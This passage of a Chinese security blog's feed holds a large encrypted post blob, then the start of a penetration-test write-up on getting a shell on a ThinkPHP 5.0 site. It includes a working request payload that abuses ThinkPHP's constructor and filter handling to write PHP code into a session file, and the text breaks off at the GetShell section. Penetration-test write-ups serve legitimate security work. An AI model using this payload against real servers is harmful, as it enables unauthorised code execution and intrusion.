0df161c121a83b19663359882a4f21f9dc3fdd8131f2cae45fd6b78619d836b995ac7b88e41a066e4fdd4f00f0d665c5bf42cbb1b3ead8794a75858052c60245ca955e4a66c3fcf5e213397e78fe5a0d1886157a7f581c5c83dc5a4b683ce18e4b8c6da4508ab61f86782a83966b81e7ed38477e0d281e0d06253621327b17c523a65c2ff6522675d27448d6505b2611a7a08004bfe2aa61f76ec17fa2a1d2acc4160ec58289fb7e854448ac3552e339d04d7ff25f1ea150edd518ae9ee446d37c4ba2c4b8fd2af4d8efee42e2d5647025de5cea105a182780ef8db24f41bf239d68169fed38c5908b045e866e31bad94747bbbede25a30a5b9f372bcbb4aae593b6e7b820527ac70366992392091b7d903316792d4a71726b8903bf5020893874dbe7b6a0c2fe6c0b5620b6d812e30e206daa0d0cee6b64afa5ed03c74fc76b806d1bf90607b7706428f70714e27c5c9bf1b94cfda4df694e869e4d7210adfe8ed97e07133f7f9198ba14caff5b81b87cedcc96a85c1046b760dca31ad29b575a0224964839b545e1468f564012a3a62a4c152f3fb59edf58c7985a68ab07911bbd70928d11638d5a7fe2db47095f57f50594888c89abcbc42c2bf184a01c6fa5a2b5d5e44432838f0fc77526cb2f1e6b00a1397e733c559b45c2b7412f0189e0e3838228332d1f441824f583f349dd9ff4789bbae4326448d9238287681f1484bb282910e44f1598239294805b03b279ce26c57086b6836c65375fb92c6181abb4ab4c9cfae5d8e41ae0e4fdba24a3df5849fdb192a31e661e9d39f3faf961461699f8b18c7e53b413de4e25816ff84fc21fa27088661dc64b67c836691221cb64a4f91978123b79a945ba154e9bacf3ee64faa77a1cfce9a570784ea69fc0a686de106fdd14253eb4b2f2df0cd6f59ad94245ff646df513118399d14c9e7ea1be64eec4adfe42bea25d2aa691deb5038cb308a20966f85531cc5171456258be01e135ae3e4c2ec02e4b894c86dfcdbb99f1d008894b146a9f6cf7eda5c9d9018a9cc5669b0b0279cf6b05399ebe14a9538b8eb5df192aa0dc7241c2d1dc0d066e722eda226912047e99c6d963877019172ce15f45d0373b01a202232c1411bfdd330340187e1d045684adde81b1d5afef07b97358166246ac94e7e25eb044bb4fd5cc7b4b707d5ad45abc33a2ed046666511cd7ccf28f93036617766d1fa64cd2a82c2a3aba821e1fea26ea09b1d7d58ef8ab60e198017917da841c0d7adaf2a7257343cf823db4c3b642c6fc99dc0d88520cd32408cfd5d19ef631e126f99edd5615ec9b5e32927a097b378eb9d7833bbeebd677e442b97997af4831ab03eab1af6551baf8cf8eeb5c799542d4276427661941fda62244f5b2aa87ce9a5b241665bf9c759ed608e73e0122be3a66c56da28d774c7ca7ff9834a7a66afef91ffec06b7ef16c4e63635184bf5008948a286e1f5bad1ed0493e2e546db08e286be53bbc3ac03fe3fca7d13f75cada9e2692f2c925fd567ab51ec72eac7f94b8f74ddd7dd89403196847698cf9401a3be1f533dd2e0ea08170e85a5b26beede00a20c644cc337009f1f1f8f843ac0477d21768babae779f507d734c1975d28d6eab1764d11ac6b518c0bd384fcb641a0dc97c2fc2d8f36197ab9a628189a09478e1597d97e63a11cdcf49000ad163e2e96b69da231626d125d69b164b48eef2451afb14347bed76b431b43882487d70a68bbee25e18f1b146be60e7f9f9e6827066229721e3f85868b9b6153dac552466e5f9114e1a24f9793477cec4351ba814dd7a2ac17cd63b00f90e1636da573a5e2df077975a47f860ff5c8f78297992805daed6f971db6f238aed44592e1ebda167ea14f7a181e941ac37cfe50b7e902c79ee56f8a2c5763a8d30743cfc20cb2f329d8ee1d90c5af59c31a0080d88d985d3e40cdba0b43e455dadfa6a642435aba7d4899fbbbbc7091247c919916c7570fe458dc5945c32399c85cd13150f6d6f586f97f01548c06bd44f317e8883f51fd551df89a75a22b801bd091363c9a12f6b7e9fad905ec8be1e211e10d40ea41bfc057d0f078b5879e69c68b2561b4e87716a16d57f0c0bad922bfcb3b864e0e94edc0ae9e6161464bf639329f53bfdd56bf76d75cbdbcd75fc3c43d2a1d732ab0ed7c1f9b056be93240ec5e6d17dc44fc3a11db572d5416e2ce65f4d6791f408842ea3fcf3ec3903284fe7c5435e9fb14c6391f47c54a1a50991229a478241eb68c0e78767a55bca11eb44e7857d1c394dfa241b28cddcde924d36d71a1215df894333e8f81b0a8faf6b70f224c91d47472dd79082d0fc194a61a4b4ba0e8887a32aeb87f4cd14144a3b473d1804177d52c1d4d74ec3ebe80921eef352129d94a90eafae8bf3aecb48136afa7ebcf827e2d63557e2b1a7958a9d90b132c8cc25690eab8380ba0c8840c7f724094e94a399869c6deaaa5774b52fcbf45b02326f57d9d35b5166875f2764d2a69233d00c9a9992390f62f538317019c06f0296c29eadf7cd6b2ad342d7d1f6632b3d001cc16a0dda3c87801c00df308446ea44223b4bca5b7de37d50632e1f5986e94665e35345a9e51834307746b530c394abee55189ae69abf3fed14e34fd7875c6b0a5dd5c568e298e28311bc5aeb814502ce69f711f99157adaddb852f429e289108ada8cbe5685e9e5221d5db2370ce603331f65b2d120e6fc4475b014533a22563f5fc77aa81bfa5d878d0e0656cb76f6e1a2c918c7eced0656373389c5b8838d859045b6fbf9e0498066c49a24fb0504748fd3532a2014f4407363ddcea186e4ef077f9c54d305584061f17da3704d9dd537888ef6057dc24e2fc03a8a14191f326644a919fb194208547fad52382816576451b8d0658ac502c84b036e7f398dc435f0ef067f20ca323c1148b95a775aba943a21729aa87c699d44d2b0e85acae280bc5ac75fd7dbebb676b9ddd4686401e59251059c8c8d32754cd4d8a6808b017f689a4c018c6d6b24ee33a7b1f592e1e0adbb57e37c5ffa133bada68b14b9311a2f220d889cb40d62205b13380c8c8b939db78738b635a222ef93b6f6ebb9d9df834d496764b5dc9c8057b5761999f89dca2a69b7942e4eecf619dd1f6b6d8fd31c36137fb69c6411b51ca45144683b4c9d2af7b4a2c93f2ad40c35663f1eb4ee804982e367815abf9559cea30de4bf2f319b4c041d15aabbbb985cdc52a906a33e519bf7e77ecdba455aaf349a09eb9b218d85cd83eedca956cbd672931f59177fdadea28d45cf458612a03a735d5bf22d4c408e55bdd8884b40522878cfcad407bd6874eba86cde76562da997b8e1cf13dd0ace5f83ac1db0e7608022b4932fc7dc651977abed9548078b37db05edb87df42c79207688d407d868cee5259e5e2e0135fe24f3fe2510e289e477a786b1554b8306f800b5d1f67dc10d919f0de98a61caf0d9c95fbb8e66c36ebc90cd76f1740321f4ee00c5c5c334ae35dc139b0876c4dc2a87823c3564f7ce5cb2cafe3c8db85622de15b45d90df5da8e0b79ec97fa341cebe3f6b0821a93c378068490ea724538323619b4e0464444e39d2b147f3fd4c1fb77b672be194221867813480d1dee55d93d150d41a35c1c9c0056641dbd32c6ba224d90e3a660cb8fe055c79fbc0dcb2b81638f07bfb65ca6253d888095dd41b81aa54b825dfe4069c99d1b7b84ba9a5dbe3b7c0c83951dea40c2a2a7f775025bb074302b2077d17a4e24aa50f145fd5ed08b7f56e0cef4dac9fb624f09638b47fd74f1737cf45f81245f6948bb8f45e7e96643ec2b057d683126fb2c66f267c6041ef2f5d86c7f2eab99cd6d8c1e9ef42801cc9a6db4b3ec2995dec3b0dc3bbe656b49d34d856666df9e7b07bdcb2923192a1e74147009121940cbd25c1cb20ed7263a9e14d58fdaaa2427c253fa212fbe36cb9994196b2d82915f2caa0c8bafcfcf5abc83894ee34d1160fb02efbed022af898ffd1f45738e8b7c7464ca2b9e73042f1e0d566fad9da0bf2c3edf23b209d272ac1d2de7321c7b1c74ea78763c66c0af864874ad4e3a0da68220e4ba243530be65308177f0ad5e449779692684a8b1080f59c8334c5bed1aaf3a1736996cfdc9eac6c99b2b3107374361beac80b81d5dc22f8056c1dba3a4c445aa23ff9556083c5312cf78a735dce102c85553870617ad203fac2e0b855d0ec8e145d8a85e46e19a8df64b59385103a7184feeea1d11e8a86cf8226813b0657337cbd49add0b39ee497f685c4293027d9e842c6f3bdabcdff09a4287f227a9fb63fa67221c8f5385d8c036890e337e4af1d3722e2bf936b328e55ddefe178b46af155a36d63170133c2b4cb3f5cde9f2b28744aef75eec15139c787418bff84f379c4a2859e557b665474d37b28c758cd9e06683f4df8baea35f9ccb4a1aa4189f7702beb6421ad8db4976292289376ffaf4dcb46ab53450095b82ad333c5507dc82821cc3ce60870b45a307971b1e5d86f9c420dfc358d7ca02d4cbe77bea738a84192111ed8de3edb67da7698193003382da99a070dab262d88895d10ec9708da8a0ad1551c948bf2bed696273b17d490c32b928b9acab00404f3834e7ebbe0a47a8c0783aff31cdcc2ce4c297c89332004f56ab040b73e6cc2b7a489fd94b69747112552160c3854e814cbcc2430e1b7891eb3dd7d61af45cacbd56aefb50a8301fadb39e827b9af680323b7113f7bb0795e82e2d0f9975485af07a6e0db7172458ecadb4debd941bdc57ea085a825ae5ce062f414b5d80c1f42b31e7a38ff0b6eb0f53d6437b5d8b796989bc632435f7cacb67f650129297ffd81cb3d18a2d6ae0b53d0a02ad1b3c55573f3f5b845cdb4523be397aa31230d90a94f66939274eb8880f8cabaa8e1819d7002e0c27fcd98b018e48ec84072342893d0453e6076d8dcab87bed469172824ace60e64308641c0ff94ba63f34d1619948d7a38dfd8a04451e533b97a4ac623d66e5e294b73987a279e6fcd480272bf712e9792591820b1f5f4f8f64439584f6e2887aef9fd536ff2d9a8dcf31302fbef135d9e6562208fbeb5e12d332f976efcb9cd63e6848caa9506ef35b08283061047db36d572551383866d3357568fc30fd3d138ae8a9dea38e4dd146d3315c4451d59e62085f548a6807325f53b441cc1ad033b3f7183130377c6dd6023f9fc9dc39ae5481573f821368f01e95a7581a0185b513e0819ce9f1207f78cb5a4ef79be3dcf7b9ab7097ba6c61bb3c995c252d14d4e54eab80144cb08d77ddabd027236f849b820cb7ae391a1225d2360a492bbbdf12154895d6f86d79fa2bd05bfb9e37c6399c016d33cf3ac6d8ec193899d007d394162926d91bdf1b021cc3295083644990c529a40744758e88134d0f120ff6982d65b5a3f35bdbf247975e61a090f023592019ee4b766c9c220f32b9dd72fd8c0f25bae958a599a620a7fa71cd71861979e34663dafb2096e81cb63f97729a8276535082e41ff1bbca6f5235966f2578ef482f502d8fa7b5aff8e26e21a15c86601e5c37813b284eb5097b481bf9e7286706fc3ae99102f0f6c0e4b75043268fadb2e388cf0ef293ec39a2f1a5bcc069ec1c88a70954ceaa599fb2d93115a31885498250b4a81c19a3cad88a37ece3f7c35ca5718e7fe5a47bf52750d0fe3ff7cba67c3138144774cd607b2c27a2f1beedcba3eb39d9f79e773b3ee366303e195de7853b746153965dde0e68ff012939d6b09b94df2e65ac1d0eefe4b623323cfb31eae7dffdc487e2b45cf300329902d0e16c92da5aac6881883c925975b1cc861511af8d2ed2e6277b68753de5bd59dc5b9cf84765578a52313bc5156866603db94a9cc848981f0337b18876decc1510dd011297155213ecffdbb26c87f1e9be3d28629c86dd5abb114e4cd862e27d01c1a0cdee5e22812460183a867a6dd4e4010cf1aadd8270ef08469071addd86fd6dee2d60545156ca23e511a6bacabdf24b5d847bb57b3ddfaa9af76fc1571ebaefb827cd041d0015abfb79ee29425acc94ab17405630893059a3383d303ed5022f968843677ec35ccdbb07695abfe0861cd496f484cefabe81aef3cbdb75507f1cf921629bc9ea0ea9b85c8c27f247469011de079290b430b8d86d03cb70660cc8ccbe26c57798278265537d022c7c556d254a133fdb25ce5aae7e10930f50da8933819c3999ebe54a2843a87c4d74522ea15b45659d6c88ce8ad8dc650d55e00c0658c1d8e05a54e432f8e8cea2c854970dca09492f01a13bae787b490072aee143e181901818bd979da757849903ce62dd51a3a37680698baff1a04d7a072b31e640f5567cfce6cd36bd6cde820ce26ce037abde3e8069ad8bf125eeedd5180070e68914595859b3da6998d734f11004969eeb5b08cbb2e849922d9da204e3ec65ef2e49081be3df6682930ffd05610ed3af93efef7f7f88edb80d5e92713ecff040b035b0444035ed028daa5870b50bea0d3e61402707ba692c18e8cc48e13821aa442ad2d68268df892e17c6abd7573e55b3e624f8a4aec739f33e6b94319fad47be71a46ae5d82b4345bab1208a4a9dd4080a5b39164fa9c0558ac06c329bcd52de1fac810f7a2647051c56f1210cca0120bac3438504219035a5de7fed4f4d9cc08bf0e21ad6bece89f7bb60403d74e2c3b5315143187777e0584387a4dd69c1bfa90fe2e1b112bdfb1da6ecca085f47cd948f9eaff53a3c02b43b004b9790c4e88a1801dfc1e0c7507a03b63c0600ec219e00a945cbfe4af73be811ed51902867f5c4193aa2eb38b499f7c13d5b1eb788b58b660e0bbeead4306898d04de13fc95bd7d9cd720af0dd5a1b3a9ab4f8a9a20350ae3a648ba197a7f501e39ee0dc172dc4312379748104276339ef5417cf2c67d09ad0e189cd6c8024c0861ee368bf568cefd44aeed99e54e5ff7f54553ccb751e174b2566247613bf5a8298dceaf7b72331519da6c253ca718d48828ed3258462d774d87bef4a51dd1736fd85abe57c3e722814c9e244cdf7fa8279505559c8832399cf1bf783a60c2d888bd2001c08b0d3e15e2a31fc7e2894df1c38bb8f94af9d28c85030a09ac3cb815c51afbae919cc9cd1f8ac485c02085b6cffd6afb5bcf951b4b106678c8c08eafb6ed3730f8cf476358d4999cba32bae1d8b1464f50b1be6ef397442a65d651f761a9b23880e183bd89fabc109a201c94ab20c6daea4d9cbf6cff1d6e710111b638aab44ecf83b303bd10104d9ea3713e32c8a91560ae3c255c16e04c336d237e7a5c0aa548bff1fdbec4cb26b4a8ce9bc98b2bb44ac9b5bc60a520d1e25f97162476cd55f3f77b1b31703985bd8d2e0cb20d68e606aa09062991c297db42657c4bfe1bd92719fc1901701155697c40450ecc6bd142d68a106f02574cc798aacd0484fc6b20378bde3c4f4ac6f4ccf011d7a799b4e02a2422da83261cfebcb09266c49e9e3e0557cbd390b28620c90075fd5cc331ebeb5dac8f709e9ffdda85dbeadd1dbb171845702cf182a910fab6149b3ddbab71af0ab9e05790312c3917ffe7c9eb66745e948ad8e3a9cdf3b6e4daee3222d3dfe437286d842618bf290efca33589ce52b2e28882e61c068c258d0dda103639a35dc290b91440cbccdc504f4d3b9cd620b75152e292786a8322d4a11bcd1acadf20ff976cf245cb8b9840d8a3e688f2968adac27c8d12a097aebe00177558fa5ce5bdb84b460d841b895027ed74b95f1a93308d6462ecaeb49a9bdfdd1c1d61e1ae524dadfe3dd8617918fc031c88d1573d03899a2ec02ecd5cb95221eb16b27de7974788351d30db970ff688d40ff790b3e12dc96e00377fc7675fccda22e0e2020eb3b851f8de0e79d181db5c933c63ff47bee1464264a98fcbb0b3ff6ad0379863d3231069d304c3c0ec3a420b618b957f9c30c8e02d2e83a611de20a1c96b8a5e48949d488e03042d5d1a203dc6a7f8e053952d4d84b0101d265b73e4eb37843055c4dd1a15a9021da6b2e109cc07b697f7a9d09558cf3544c8d291578f6aa56b31330bf17f33dae89b035a06d06867fcecc579ab707db0fed3f38c0d5759765aec102c8c993a90cf5292314f5ebedee1f303e7424cc41fcb07efbf0720b4cf24645b1b889b8fe12dc713c98946d90439ac247a35398b4640bc7c01ce2951fa960e436671714694b5f518ccea93f09a7a8924088a196625a8b351b6b3bb8688b15359a691d4a06b5e808e31812f064f40a7982bf24ec55c79ec1f8a6e63effa3a9c593d4feb381a3b1066f220654e012fcb2838d41c98036d566a96c67a9bc8ecbfce422a3d9ec4ecb10fbdf23cf2cc97bc27aeaede8723098fa4d48475d58f5a0f62d82c2d2b515d48c635124a83516c01bd0eed154ad85fd7aaba0dce9133e7f4d25dcc22d58c25303effab78552b44c73825f66a5354829f593f6f46546f692c1c0b8c11586976fdab8283e483121105186d48d8fb3f803cffec11d2dfc90b924665240ac67f788e5c3b203c8ee64bd00fcff5db908703c302e2b41bc5453fea39bc03accf1ae4439e3a98f0c600df29423f14a2d9b153894e9319cf35902173fcd50b7c123cb05d52ede45207108f997784349c423fef2b991ae23e5f220f06ad1aae0939259944ad5508a2e1b47b61bacaf131beacabc835d378a78ee36aa3503239352bc87c83e227079e09d6da25313bd5fa5ecfcb4028d8c95825b44cb1f2139447d232b0e2e6e8207b5baa529f810b9632c5c1e2697e675e7d4a6ddaa9dd022621eba5008d9344ae1b2e5d26fe44db0856bc6f2e38f27e03e3af711aab70bfe9911242297b5fe4bc27191d7459d64f0fecac069549b7f24b8e95b4b6d89ef679f67925476134e6e74dd2fc7db9843826d6760cf8ba0f3b5089ca043b93247a002b1fb9e476fc31750bde10dc5dcf7336022cea2ed0f2789421ca399697d9f44f19bf04c995daa9b4338fa8e2e449e3648e69005950db1acfa50efbbd392e5eb9310b2929f4b5f6c20c2d95bdf252c176e2b635c0ca69c3e887b56254adf3675bb98af0a6feb0f7b2533f97347e7ab989b48840adabab5a1998e8f0d97043a52c655b8e5f448b7b899a98788aff1c34c99bbccb43b55e5032747ae205df281c5161c42a88cf49abd4df1c86d63d8cd835863eecc2582bf38819f76ef08ee7c6c4e7061cb118bbf994fa1452f5a9cdb82c403961cf1c33c66f4f42f002ffeaec20c567356f4d159fe08713c1adb9393c9befc0c1959a6a1bc48c74b501283c747914facc1eea528e0746445cdd4594d965182c39518dd4aed61c817bef19eaad1a8aaf57218c5a1aed82c074123a68e5afddd244d805c8db6e9974c74567431a3a577fc6a30ca28a93ca89e80e467147ff7551c1cb983c11f4d779607ee70d2a57b0c83167006b468cb0f635d1bf7955856865d55986a6b8d96d744c6a9a7d96cd02383fe6d801df6e47d34fae32440eb844acdc98b68c1cff0e35971db4e333048e619011a97accc3c3dbf8363a53beccc9bb5b211e39ef753df888dde659d83c4096dd3578917a2045886271758de0f5d808d35b691b75f75e7dac355b4c1081d7e934a7e8e7726f0f5a9ae734c7fd2d685597acd88980eb170b716057508666057ec93a22392eaed6049b64690f4dd56d7d3615285eecfd4b36d5f32b92d32de28ffcda793dc35e549665c2e43425f6d1f141ae0d02a4acb1bef6b4189b652113bb2f757069a62c2508987f3dbd02808efddebec1a0d2ce12583b0665132d698c850427d3ddbf0f10ef9834d2e896f665fde49329061f57740ba5b376e19166d4375fd3562c2661ce5318de32629f86d0be5b0d87056b5bf37889ff21fa8395abeccf8ae31dfd52a05c8ea448193ade47a04eef0208844f711bad84a5e75a694f9bc34da72bd6eac9340be5809aef8bb43bd39098aea36f4faeb9914474a6938be1e8b7110082e17975ecfbbfb3779d7694bdc45f7141d5c2b763403f120352e659fb895f59f0fc414ef54b3d7e0d79c52d695750ec6f2f4688f2059ce48a7a75ff9174c923205de4aeb8471dd6ce6b455b645fd7a9bcf920c1668248416013c5c4cdb4ee290604f5705d66ac88d6437dc6a1088afc7421441c59e8bcfb6811db03c73868e6f89c3c225e929324c90832c4b2679cb460e5308189b0579a66e9c5cb735d60bf1e3116c3e78aed7503c4b06ea29d941132b1d2c2be1fcb6a95d6b993f924d49ec660e9df89f55652e5ef3af7c58a8f41209ff4cdb707fc65f84c6d0c9434525c47fb25f48eb706b76da20bd841ae8fcb371f0b48e2f4ffb4f1f6cd2b0ef3113dd3ab6d2456f9f55fa4dad8e3425e4c09685b89ec71c131373877203fe34770cc9b97a2a823144175a4430e03f5247754b8594e65c22a79487b37c203bfd7ed023d4984f2e1937f2c2ce8ba5fde41722d6e9e50fa1e40bee2471658edeca1554f1e77050e2072b0c57c036814b1452512e0ae5212ec68528c14faf4ea83cc6e36c95df2b2bc564b572b681888c438deade0be90b941c8b4761cea0ebb766662206f3311973f41fa58b7845e620318bb09f9c37fe744a145a10938ff3962c242218fd6fd2edd220e7864bb37af7acf79c6fef7222436500afc91b93f6c4d7cabf192f70c37d2e4ee244a02f931f32bd7a3733abd7f0c8a596d913a8c24696f2aeb5ed93f18a6c1047cf5bdaf92bfe0118427a5bcbb7b0714855064f1f488c5147c66e8feb262f47ca06e7203d398430d50d991668f3c5ee19e873b7d2423a63bca3bdaed8afd50f80b58d2bfba872ab47c6e303909f2c2241107b0d2fa8a7b9fdf44554c40e92d0f27e047cb4b97445f687f4dc8b94fa7875a8a7e0c9595c9e71002af63ec10ccb21b7d99c642606e2108e6423bbaba75e928fbdc2c681d9382b7672459f67eeae6f335e5aa4f31de7d249818b851bf050c8ac8d4b4217156e875a681f6dbb9f652c34c41b42990f2df6991a6ca5c4b7d627ae5c439dc838ba957cdab452beed0b2141881627bbb9e38775baeb2f8d00f20c82a5f88170f6fd4ffc4eda32e7c134adfad0e2783f8ef2cacd2964f5f92b6c6274b21533478261cbe0ca8c132b3e9653f0732446cec486b9b8f20f3cf3e32d33821a71ac5ba7ae831696f2ef662c95518b98096e0ac3f37a22cbfd951c8f306190707bf3e6fe6edefd54b29082ec8f7602cd6841d758eb141489ecb005c81952be15f7f30d5acf331c30e7953f043441f55dbeb46db8fced35f918705d5007cd993614c2970b6fd6df3de2480ca5fe85795f1aaf0edcd9d5dbe4b1ec198208660c5e6aeea9d8ed86907fcdbc399c1056089f493e034602212e062352705bbb0235b1c160b66f2b8fad44937dd7326afecde78d0bca863d35c6e87f69e9cbbf8b9a5a47d1571e91b817a7d8f62f8ed276cbc4a6298b569f5b2b7c73c03deff234c9298810a096492bcea103f3e3a4f12c0d73da0457597ac353fdbb3544622ce67656cb641bc9e64f6c80247677319b5338eaef9656756efe36cc82dc65b8ed6c5d618ed0f34de46745564c356d79f3ee13efeb21748d9b428e84c9932a3244dc8370974c2ead5ba18b7dae239f18acf4148d2230cc5eb807b9045cad2a20aba137dba3565e80d49f95c76d1f0935d4590553580ed485b64b974e3389dcfece12e73bae7d52c6bb12d30b0a9f888ab7ab48d8230c985157968535223deff2960bb3d2c8511e06139b2a615ff04903fcfd9f30965aaf341dae81a0ef1ba325df701101be3b2be1e1e0979698b9ae638852e6413f7d4a423eb33c839aa3c293c6bc6d5b392292d5644a7723ed5c7e4ecb23ad1f2588b7ca928e3b40be4e3ad110998d03ea644345c6889e665d30f0b49d34dc0214551f89bdf8560329d893704f7b9dde212f9515d64b3313fd5b1aa87de7b6d9a5d8935228827316617936746af180bf4028de0b5230b57171e6c7329bde33c4e20f6b9678f4f10155f3071cdc8e09aa81683a9c90554986969927063d3e7a88b019afa3989445c3392125acfd2e87b7404e5ab09b77d35f37f9b798aac772ba2e078eb9b0e0114982095de450b536544a46020fbec1c662b8dff37c8bf61f691b182bd386b84ee78eabc6a0bcc14c04f6237db90d532039bd693c66a3c488a4b387638ccf86e4db31fb67f7c36f233d246b0c49963d48463e812025976754090a1c50a58c071ed55d35621876baf9e8bec4e43ef03686ce511cf193c011411c9a58956535eb1ecd9e901a87cf11799ff25d6aadf10c0d34dc15b1c057e8ab55069bcf283f98fadb785db639d49fdffdda4d1e43c2b69056573ffbff1371248e74c9a092285ba5d7f6131ef771f98443f4929e6aa6fa711de7fac42b0a33a1ce1e8373c278b2e93d2e7fc74161dfc6b2bf0e437abe43e036900ad141eb033728364fd988eee1094385b45054194fc946046ead7251db3fe269e391d23a29707d245c9c0a96a8d36e8bff3663929b9878d66f58fce60289f50fbfcbcfe6da0624a76a6b1a8a7b57d335bd6b93ec8b536dbc9ab1510b34d61c90ee499b8eb75b14fa1a91dbf8c4783007f270f9a1047f67dd25870a869914f1185c311ae103efc015551d96baefabeccc3801d8cee0f1ee88681ac5eaf84db70ddd3792ec1385a7532f8a87e2db1eea488c7819870d751c0ca744b15459c4bdb9191766c46e4301e6d1946c26d99c87b2920b71416e394b03d9947c380464b960e40259570c1f4618548d31c06c9ccda3fb8a98ff13a4f34a4de1158f52e68a9883002615ea76549f6d679162357dfa7e9c5476cd24b73719de622359313ac3fe252ccc0ffa10038adba26fcde63fdb10a6e62fe3ceb9501aaeead8bae7497616cfbb786a7fc7386fe044ac0f3e85b079f3ea97517e788c269d8b595673d4217d136f77af6464b596d7851016e607bad4154a281298020e14c27bd6c557eb469c6968d1016b5f939f00b2d6f2685a3f27defd9a4240857e48c312ff67f8153bdca7ee0e2fccabf63bb4d287ceb5a039f9eaea6894f94cfc25e00f1951f55e370586f7e01791dc7d4adf76346f5471724df0926586f22b78b056830272cfc362f9f27c83a2ee8720902155e6c9c5ee3c51a0aeb12840a24e114afee139a0dadfe7f78dd54bf6f5b0653b8a50d5c4e8e3f7012c616b15293e879ede74ff539fc322cf7094216d111ccebecb9c0b525e7c33d4cbc9797d9bc405817eb942bc8f0dac18af7c8b5a7462c4af0e1a78841ab927108151837651651f02e397c9f2096283dcbf18b226131798f972148afeeb002086234b1aa01ad5d13d469de47709c19577b285f6c9cb25db58beeee87b1414360f144a87d33c64da0c813c0f4e2280c193396fc27e0d02172deeb7d2029dce51027891c3c1d31761bab24f577f24c052b89d60765fb2bfee9b1fffa626780e74b0ef0896e5aa9891aebdaa302fa04d1307798936775ed765ad43553effa26a60c4111885846a8fe724e1ca9da1198410df089c404c8486fc5005476cf53ec816810c72f6cc86517e525f9c00a8cf60c198da60eb75703b5f23bf2f8bb69ece72e279dc41ed9143dc1294363d4835d360c9a22e2e6901cb4851284d2d0e8fa7cf9e2b1839102daf9bc71dff733eb2f914795a9045f0f80d6b741a5ee940cac4f5b51640dd5015fe1dc3023ab8b9e94ed493811c8e9761f119af5c065b4a027fe1b0da0ee3ea4147aed2d902b819b2aad395a87299de9b2b8d38a115e0d10f88d75a53bcc0ced449a857074c8b47c125f6417f307300ef02c89a14da62d50425b3d2bdd02efb27901dae68317524d913b1556a71bbf79a88edf17e1479887f502c3b035b5943acea82c9853f19e5ed1aa8a659839637f86c8fdd228802d6f31d85dfb02ef9067954eb2577781c1ed68de54a9377a28ad1889e50719dca566c94633ce9ce5b628ec2c9615615f1903b20b60ea47c809a1fb2e1b29bb9e5a77e9dcb30ad8be16b4fa70751b1cd9ab655c59a267a30b29ae44d6b8341a6eb82b630a1fe0709c7053c9b2c8dfddf8e830188a0faa61458f5032819f0d44e590fbaf677e2b81d4963f7855d0c6b8c0337579fca8841f1829ddd0fe12ce7ff12cc1e763a3c2f1a1d0350784886f3d0b316dd81e69df05429dd8475d903b28f74ab04e362220bc60f5ea47fbd64233d7426844eb79ec61e647c04eb4ed4390a8804d7e2d0513a2cdf0a7c4503e2e3b2923e1451df9d6e59e76a8556a3b7ac74799f60683b595cd3beea65cc3eab34d99b02b319c60b5bfabb43b3638cff2d68c8bb01ff35b74fb8b74b77bcdac5202d29421b39338854fc6bc0ad9ce4c4810681efb52cf06f1b6a656f840e24ae3cbbe1a51f136fd90fe656b75d69e522ac195fe9b21edca2c33031af5fdce7397ca3e970e990056c394fb365415774cefa11c855bc9ea6ed2657f60dee4ece7c2d5686d27e138fe5e25414df0be093ee26047ba1bfd07dc34deaa43f412d80951516d0c01cfb61273eebe59c18e2b39be0d2b2b7cadf67ecf7bf275bb9d062b23f7705796b7cd0bbf07890bc16e032b3c8b7321add261f5de2f2908b083482795aac375d34b048f226868ed200410294d782024a4690e23b6f5145e884a96422ec560db46c12a952136695be9809ace6a043186b24d44421525dce783d559ee1ba6586087c02c61ef16fc1490488e75d80c99d3ab6bd2b4f23bcf53132f09c8110d8967c45312c9a03b03c0a66a2e1836c700aae4ce96aa8e55bfdab30f4cccb96c1348b6f283874339bcd17c7dce764aad1a0b1215958f980ad11902aad3d154282a6008c064b29b3bd83aa3ec98b8f3f462247d1d8a668a7ee4c889783e70e29378561e33b413930ae215cae822974ba3b55ae</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>渗透记实|ThinkPhp绕过限制GetShell</title>
    <link href="https://www.se7ensec.cn/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/"/>
    <id>https://www.se7ensec.cn/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/</id>
    <published>2020-02-14T02:10:24.000Z</published>
    <updated>2021-01-23T14:13:50.651Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文章首发无法溯源安全团队公众号</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>项目里遇到一个站，用的是ThinkPHP V5.0.*框架，且开启了debug模式，本以为一发payload的就能解决的事情，没想到拿下的过程还得小绕一下…</p><h1 id="0x02-踩坑"><a href="#0x02-踩坑" class="headerlink" title="0x02 踩坑"></a>0x02 踩坑</h1><ol><li>尝试命令执行，system被限制了</li></ol><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/1.png"></p><ol start="2"><li>尝试包含日志文件，open_basedir限制了</li></ol><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/2.png"></p><ol start="3"><li>这里有个思路，可以去包含runtime下的日志文件，但是thinkphp的日志文件比较大，而且有时候会有很多奇怪的问题阻断代码执行，暂且作为备选方案</li></ol><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/3.png"></p><ol start="5"><li>尝试通过thinkphp本身Library中设置Session的方法把脚本写入tmp目录里的Session文件，然后进行包含</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>但是。。。</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2020.02.14/4.png"></p><h1 id="0x03-GetShell"><a href="#0x03-GetShell" class="headerlink" title="0x03 GetShell"></a>0x03 